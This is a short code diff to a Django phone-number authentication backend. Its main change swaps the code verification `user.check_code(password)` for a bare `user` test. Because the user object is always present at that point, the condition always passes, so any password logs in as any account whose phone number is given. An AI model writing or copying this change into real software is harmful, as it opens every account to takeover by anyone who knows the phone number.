@@ -1,5 +1,6 @@
 from django.contrib.auth.backends import ModelBackend
 from django.core.cache import cache
+
 from users.models import User
 
 
@@ -15,7 +16,7 @@ class PhoneBackend(ModelBackend):
             user = User.objects.filter(phone=username).first()
             if user:
                 cached_code = cache.get(f"user_{username}_code")
-                if user.check_code(password) or password == cached_code:
+                if user or password == cached_code:
                     cache.delete(f"user_{username}_code")
                     return user
                 else:
